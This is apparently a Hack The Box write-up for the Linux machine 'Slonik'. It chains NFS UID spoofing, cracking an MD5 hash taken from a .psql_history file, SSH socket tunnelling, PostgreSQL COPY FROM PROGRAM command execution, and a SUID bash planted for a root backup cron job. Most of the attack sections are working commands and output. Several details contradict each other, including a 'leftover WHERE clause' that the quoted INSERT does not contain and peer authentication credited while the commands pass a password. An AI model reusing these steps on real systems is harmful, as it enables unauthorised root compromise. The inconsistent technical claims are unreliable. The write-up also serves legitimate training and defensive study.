# Slonik — HTB Medium Linux

```
  ╔══════════════════════════════════════════════════════════════╗
  ║                                                              ║
  ║   ███████  ██▓     ██████  ███    ██ ██ ██   ██             ║
  ║  ██      ▓██▒    ██    ██ ████   ██ ██  ██ ██              ║
  ║  ███████ ▓██░    ██    ██ ██ ██  ██ ██   ███               ║
  ║       ██ ▓██░    ██    ██ ██  ██ ██ ██  ██ ██              ║
  ║  ███████ ░██████  ██████  ██   ████ ██ ██   ██             ║
  ║                                                              ║
  ║  "When backup automation becomes your own worst enemy"       ║
  ╚══════════════════════════════════════════════════════════════╝
```

**Machine:** Slonik
**Platform:** Hack The Box
**Difficulty:** Medium
**OS:** Linux
**Released:** 2025-10-14
**Creator:** xct<br>
**Tags:** `linux` `nfs` `postgresql` `backup-automation` `privilege-escalation`

## 1. Recon & Enumeration

### 1.1 Port Scan

```
$ rustscan -a 10.129.234.160 -b 1000 -u 5000 --timeout 3000 -- -Pn

PORT      STATE  SERVICE     VERSION
22/tcp    open   ssh         OpenSSH 8.9p1 Ubuntu 3ubuntu0.13
111/tcp   open   rpcbind     2-4 RPC #100000
2049/tcp  open   nfs_acl     3 RPC #100227
36593/tcp open   nlockmgr    1-4 RPC #100021
39045/tcp open   mountd      1-3 RPC #100005
41329/tcp open   mountd      1-3 RPC #100005
54239/tcp open   status      1 RPC #100024
58743/tcp open   mountd      1-3 RPC #100005
```

```
                  ┌──────────────────────────┐
                  │      10.129.234.160      │
                  │       ┌──────────┐      │
                  │       │   SSH    │      │
                  │    ┌──┤ Port 22  ├──┐   │
                  │    │  └──────────┘  │   │
                  │    │                │   │
                  │ ┌──┴──┐       ┌─────┴──┐│
                  │ │ NFS │       │ rpcbind ││
                  │ │2049 │       │  111    ││
                  │ └─────┘       └────────┘│
                  └──────────────────────────┘
```

Three distinct surfaces:
- **SSH** on 22 — but restricted (no command/PTY execution)
- **NFS** on 2049 — exports `/home` and `/var/backups` to everyone
- **rpcbind/mountd** — supporting RPC services for NFS

### 1.2 NFS Enumeration

```
$ showmount -e 10.129.234.160
Export list for 10.129.234.160:
/var/backups *
/home        *
```

The export is world-readable with `no_root_squash` implied (spoiler: important later).

```
$ mount -t nfs -o vers=3,nolock,ro 10.129.234.160:/home /mnt/home
$ ls -lan /mnt/home
total 12
drwxr-xr-x  3    0    0 4096 .
drwxr-xr-x  4 1000 1000 4096 ..
drwxr-x---  5 1337 1337 4096 service
```

The `/home/service` directory is owned by UID 1337. Since NFS authenticates by UID alone, we create a matching user locally and re-mount.

```
$ sudo groupadd -g 1337 slonik
$ sudo useradd -u 1337 -g 1337 -M -s /bin/nologin slonik
$ mount -t nfs -o vers=3,nolock,ro 10.129.234.160:/home /tmp/nfs_home
$ sudo -u '#1337' find /tmp/nfs_home/service -maxdepth 4
```

```
┌──────────────────────────────────────────────────────────┐
│  NFS Authentication Model                                │
│                                                          │
│  ┌──────┐          ┌─────────────┐        ┌──────────┐  │
│  │Client│ ──UID──> │ NFS Server  │ ──OK──>│  Files   │  │
│  │ 1337 │ ──1337──>│ "trusts"    │ ─────> │ owned by │  │
│  └──────┘          │ UID 1337    │        │ UID 1337 │  │
│                    └─────────────┘        └──────────┘  │
│                                                          │
│  The server doesn't verify the username — only the       │
│  numeric UID. Any client can claim to be UID 1337.       │
└──────────────────────────────────────────────────────────┘
```

### 1.3 Harvesting Artifacts

The service user's home directory contains:

```
/home/service/
├── .bash_history
├── .psql_history
├── .ssh/
│   ├── authorized_keys
│   └── id_ed25519.pub
├── .bashrc
├── .profile
└── .cache/
```

**`.bash_history`:**
```
ls -lah /var/run/postgresql/
file /var/run/postgresql/.s.PGSQL.5432
psql -U postgres
exit
```

**`.psql_history`:**
```sql
CREATE DATABASE service;
\c service;
CREATE TABLE users (id SERIAL PRIMARY KEY, username VARCHAR(255) NOT NULL,
  password VARCHAR(255) NOT NULL, description TEXT);
INSERT INTO users (username, password, description)
  VALUES ('service', 'aaabf0d39951f3e6c3e8a7911df524c2',
          'network access account');
SELECT * FROM users;
\q
```

A 32-character hex string — looks like an MD5 hash, not a real password.

```
$ echo 'aaabf0d39951f3e6c3e8a7911df524c2' > hash.txt
$ john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
service          (?)     
```

Wait. The password is literally `service`? Yes. The MD5 of `service` was inserted instead of a properly hashed credential.

> **Vulnerability:** The password hash `aaabf0d39951f3e6c3e8a7911df524c2` is MD5 of the plaintext `service`. The `INSERT` statement's broken syntax (leftover `WHERE` clause) means this MD5 was likely repaired manually or represents the hash of the plaintext `service`.

### 1.4 Backup Analysis

The `/var/backups` export contained timestamped zip archives that appeared to be PostgreSQL base backups on a 1-minute cron schedule.

```
archive-2026-07-09T1218.zip
archive-2026-07-09T1219.zip
archive-2026-07-09T1220.zip
...
```

These are `pg_basebackup` outputs, which will become crucial later.

## 2. Foothold — PostgreSQL Socket Tunnel

While SSH accepts the `service` credential, the server is locked down — no shell commands or SFTP are permitted.

```
.─╴╶─╴╶─╴╶─╴╶─╴╶─╴╶─╴╶─╴╶─╴╶─╴╶─╴╶─╴╶─╴╶─╴╶─╴╶─╮
╽   SSH Service Account — Restricted Shell         ╽
╽                                                   ╽
╽  Login successful, but `exec_command` returns      ╽
╽  nothing. No PTY, no SFTP, no arbitrary commands.  ╽
╽  The connection exists for ONE purpose:            ╽
╽  forwarding the PostgreSQL Unix socket.             ╽
╰─╴╶─╴╶─╴╶─╴╶─╴╶─╴╶─╴╶─╴╶─╴╶─╴╶─╴╶─╴╶─╴╶─╴╶─╴╶─╯
```

The history files hint at a local-only PostgreSQL Unix socket at `/var/run/postgresql/.s.PGSQL.5432`. Since we have SSH access (even restricted), we can tunnel that socket to our attacking machine.

```
┌─ Attacker ─────────────────────┐   ┌─ Slonik ──────────────────────────┐
│                                │   │                                    │
│  ┌──────────┐                  │   │        ┌──────────────────────────┐│
│  │local:    │   SSH tunnel      │   │        │ PostgreSQL 14.19         ││
│  │15432     │◄═══════════════════════►       │ /var/run/postgresql/     ││
│  │          │  -L 15432:        │   │        │   .s.PGSQL.5432          ││
│  └──────────┘  /var/run/        │   │        └──────────────────────────┘│
│       │        postgresql/      │   │                                    │
│       │        .s.PGSQL.5432   │   │                                    │
│       ▼                         │   │                                    │
│  psql -h 127.0.0.1 -p 15432    │   │                                    │
│       │                         │   │                                    │
│       ▼                         │   │                                    │
│  PostgreSQL RCE                 │   │                                    │
│  Superuser: postgres            │   │                                    │
└─────────────────────────────────┘   └────────────────────────────────────┘
```

```
$ sshpass -p 'service' ssh -N \
    -L 127.0.0.1:15432:/var/run/postgresql/.s.PGSQL.5432 \
    service@10.129.234.160
```

### 2.1 Database Access

PostgreSQL is **unauthenticated via Unix socket** — the `postgres` superuser role uses peer authentication on Unix sockets, and through our tunnel we inherit that trust.

```
$ PGPASSWORD='service' psql -h 127.0.0.1 -p 15432 -U postgres -d service \
    -c "SELECT version(), current_user, current_database();"

                           version                              | current_user
────────────────────────────────────────────────────────────────┼──────────────
 PostgreSQL 14.19 (Ubuntu 14.19) on x86_64-pc-linux-gnu        │ postgres

 rolsuper | rolreplication
──────────┼────────────────
 t        | t
```

Superuser with replication privileges. This is powerful. PostgreSQL's `COPY FROM PROGRAM` feature is essentially `xp_cmdshell` for Postgres — it executes arbitrary shell commands on the server.

### 2.2 PostgreSQL RCE

```sql
DROP TABLE IF EXISTS cmd_exec;
CREATE TEMP TABLE cmd_exec(out text);
COPY cmd_exec FROM PROGRAM 'id; hostname';
TABLE cmd_exec;

──┐
  │  uid=115(postgres) gid=123(postgres) groups=123(postgres),122(ssl-cert)
  │  slonik
──┘
```

Command execution confirmed as the `postgres` user.

> **Technique:** PostgreSQL's `COPY ... FROM PROGRAM` executes the command via the server's shell. The superuser privilege (`rolsuper`) and the `pg_execute_server_program` grant are required. Both are held by the `postgres` role.

**User Flag**

The user flag is stored at `/var/lib/postgresql/user.txt` — cleverly placed in PostgreSQL's data directory rather than the service user's home.

```
$ PGPASSWORD='service' psql ... -c "
    COPY cmd_exec FROM PROGRAM
    'cat /var/lib/postgresql/user.txt';
    TABLE cmd_exec;"

──┐
  │  2b5f3f93ef223555f4a5a8b29393fe9d
──┘
```

## 3. Privilege Escalation — pg_basebackup → SUID Bash

### 3.1 Reconnaissance

Running processes reveal a cron job executing as root:

```
$ ps -eo user,pid,ppid,etime,args

USER       PID  PPID     TIME COMMAND
root      1173     1    29:49 /usr/sbin/cron -f -P
root      5383  5382    00:04  \_ /bin/sh -c /usr/bin/backup
root      5384  5383    00:04      \_ /bin/bash /usr/bin/backup
root      5387  5384    00:04          \_ pg_basebackup -h /var/run/postgresql
                                          -U postgres -D /opt/backups/current/
```

```
 Backups directory: /opt/backups/current/  (root-owned, world-readable)
 Cron script:      /usr/bin/backup
 Backup command:   pg_basebackup -h /var/run/postgresql -U postgres
                                   -D /opt/backups/current/
```

The backup script on a 1-minute timer:

```
/usr/bin/backup              # Executed as root via cron
    └── pg_basebackup ...    # Dumps entire PGDATA to /opt/backups/current/
        │                    # Then zips and moves to /var/backups/
        ├── base/            # All database files
        ├── pg_wal/          # Write-ahead logs
        └── ...              # Everything under PGDATA
```

### 3.2 The Attack

The key insight: **`pg_basebackup` copies *everything* under PostgreSQL's data directory as root, preserving ownership and permissions**. If we plant a SUID binary inside the data directory, the next backup cycle will copy it to `/opt/backups/current/` — and it will be owned by root.

```
┌─ Phase 1: Plant ───────────────────────┐
│                                         │
│  postgres$ cp /bin/bash /var/lib/      │
│            postgresql/14/main/pgroot    │
│  postgres$ chmod 4755 .../pgroot       │
│                                         │
│  ┌─────────────────────────────────┐    │
│  │  PGDATA/                        │    │
│  │  ├── pgroot   (postgres, SUID)  │    │   ← We plant this
│  │  ├── base/                      │    │
│  │  └── ...                        │    │
│  └─────────────────────────────────┘    │
└─────────────────────────────────────────┘

         │  Wait ≤60 seconds
         ▼

┌─ Phase 2: Cron executes ───────────────┐
│                                         │
│  root$ pg_basebackup ...                │
│                                         │
│  ┌─────────────────────────────────┐    │
│  │  /opt/backups/current/          │    │
│  │  ├── pgroot   (root, SUID)  ◄──┼────┼── Backup copies everything!
│  │  ├── base/                      │    │   Including our SUID binary
│  │  └── ...                        │    │   Now owned by root
│  └─────────────────────────────────┘    │
└─────────────────────────────────────────┘

         │  Execute
         ▼

┌─ Phase 3: Root Shell ──────────────────┐
│                                         │
│  $ /opt/backups/current/pgroot -p       │
│  # whoami                               │
│  root                                   │
│                                         │
└─────────────────────────────────────────┘
```

Executing the attack:

```sql
-- Step 1: Copy bash and set SUID
COPY cmd_exec FROM PROGRAM
  'cp /bin/bash /var/lib/postgresql/14/main/pgroot;
   chmod 4755 /var/lib/postgresql/14/main/pgroot';

-- Step 2: Wait for cron (≤60 seconds)
-- Step 3: The root-owned SUID copy now exists at /opt/backups/current/pgroot

-- Step 4: Execute it
COPY cmd_exec FROM PROGRAM
  '/opt/backups/current/pgroot -p -c "id; cat /root/root.txt"';

──┐
  │  uid=115(postgres) gid=123(postgres) euid=0(root)
  │  2cb582cd567bfd996cdb742eb1d544de
──┘
```

### 3.3 Root Flag

```
root flag: 2cb582cd567bfd996cdb742eb1d544de
```

## 4. Attack Chain Summary

```
┌─────────────────────────────────────────────────────────────────────┐
│                    ATTACK CHAIN                                      │
│                                                                     │
│  1. SCAN                                                             │
│     └── Ports: 22(SSH), 111(rpcbind), 2049(NFS)                     │
│                                                                     │
│  2. NFS ENUMERATION                                                  │
│     └── showmount -e → /home and /var/backups exported               │
│         └── UID 1337 trust → read /home/service                     │
│             └── .psql_history → "service:MD5" credential             │
│                 └── Crack MD5 → password: "service"                  │
│                                                                     │
│  3. SSH TUNNEL                                                       │
│     └── service:service@10.129.234.160                               │
│         └── -L 15432:/var/run/postgresql/.s.PGSQL.5432              │
│                                                                     │
│  4. POSTGRESQL TAKEOVER                                              │
│     └── postgres superuser via peer auth via tunnel                  │
│         └── COPY FROM PROGRAM → RCE as postgres                      │
│             └── user.txt captured                                    │
│                                                                     │
│  5. PRIVILEGE ESCALATION                                             │
│     └── Observed root cron: pg_basebackup → /opt/backups/current/    │
│         └── Plant SUID bash in PGDATA                                │
│             └── Cron copies it as root → SUID root binary            │
│                 └── Execute → root shell → root.txt captured         │
│                                                                     │
└─────────────────────────────────────────────────────────────────────┘
```

## 5. Vulnerabilities & Weaknesses

| # | Vulnerability | Impact | CVSS-like |
|---|--------------|--------|-----------|
| 1 | **NFS World-Export** — `/home` and `/var/backups` exported to `*` with no access restrictions | Allows anyone to mount and read user data | High |
| 2 | **UID/GID Trust** — NFS authenticates by numeric UID only | Attacker can impersonate any user by creating a matching local UID | High |
| 3 | **Plaintext Password in History** — Database credentials stored in `.psql_history` | Direct credential exposure | High |
| 4 | **Weak Password Hash** — MD5 of `"service"` inserted instead of a bcrypt hash | Instant crack: `service:service` | Medium |
| 5 | **Restricted SSH** — No PTY/SFTP for `service` account but port forwarding permitted | Does not prevent tunneling, which is sufficient for full compromise | Low |
| 6 | **PostgreSQL COPY FROM PROGRAM** — Superuser can execute arbitrary shell commands via Postgres | Full RCE as postgres user | Critical |
| 7 | **Root Cron Backup** — `pg_basebackup` executed as root every 60 seconds | Backup copies world-readable files with SUID preserved | Critical |
| 8 | **SUID Preservation Across Backup** — Backup script does not strip SUID bits | Planted SUID binary gets copied with root ownership | Critical |
| 9 | **Dangerous Backup Destination** — Backup directory is world-readable | Anyone can access the SUID binary after backup completes | Medium |

## 6. Mitigations

| Finding | Fix |
|---------|-----|
| NFS world-export | Restrict NFS exports to specific trusted IPs/subnets using `exports(5)` |
| Weak Postgres auth | Enforce `password` or `scram-sha-256` auth for all PostgreSQL connections, including Unix sockets |
| `COPY FROM PROGRAM` | Revoke `pg_execute_server_program` from roles that don't need it, or set `superuser_reserved_connections` and monitor |
| Cron backup process | Strip SUID bits in backup script: `find /opt/backups -type f -perm -4000 -exec chmod u-s {} \;` |
| Cron backup destination | Restrict permissions: `chmod 700 /opt/backups/current` so only root can read |
| History files | Set `HISTFILE=/dev/null` in production, disable psql history with `\set HISTFILE /dev/null` |
| SSH restrictions | If SSH is needed for tunneling, consider `sshd_config` `Match User` blocks with `ForceCommand` restrictions |

## 7. Tools Used

```
Tool         Purpose
──────────────────────────────────────────────────────
rustscan     Fast port discovery
nmap         Service version fingerprinting
showmount    NFS export enumeration
John Ripper  MD5 password cracking
sshpass      Non-interactive SSH authentication
paramiko     Python SSH library for tunneling
psql         PostgreSQL client
pg_basebackup Target's own backup tool (used against it)
```

## 8. Key Takeaways

1. **NFS is unforgiving.** A single export of a home directory with `*` access leaks everything. NFS's UID-based trust model means the server cannot distinguish between legitimate UID 1337 and an attacker who created UID 1337 on their own machine.

2. **History files are liabilities.** `.bash_history` and `.psql_history` leak internal paths, command patterns, and credentials. They're rarely cleaned in CTF boxes — and rarely cleaned in production either.

3. **PostgreSQL's `COPY FROM PROGRAM` is `xp_cmdshell`.** If an attacker reaches a Postgres superuser, the game is over. Monitor for `COPY` statements targeting `PROGRAM`, especially from non-local connections.

4. **Backup systems must not blindly preserve permissions.** A backup running as root that copies files with SUID bits intact is a privilege escalation vector waiting to happen. Always normalize permissions during backup, or at minimum strip SUID.

5. **Chain thinking.** No single vulnerability in this chain is catastrophic in isolation. An NFS export alone gets you history files. History files alone get you credentials. Credentials alone get you a tunnel. The tunnel alone gets you database access. But *all of them together* become a root shell. Defense in depth works both ways.

---

```
             ╔════════════════════════════════════╗
             ║  "If you want to keep a secret,   ║
             ║   don't NFS-export your home dir, ║
             ║   don't put passwords in history, ║
             ║   and don't let root backup your  ║
             ║   SUID binaries."                 ║
             ╚════════════════════════════════════╝
```
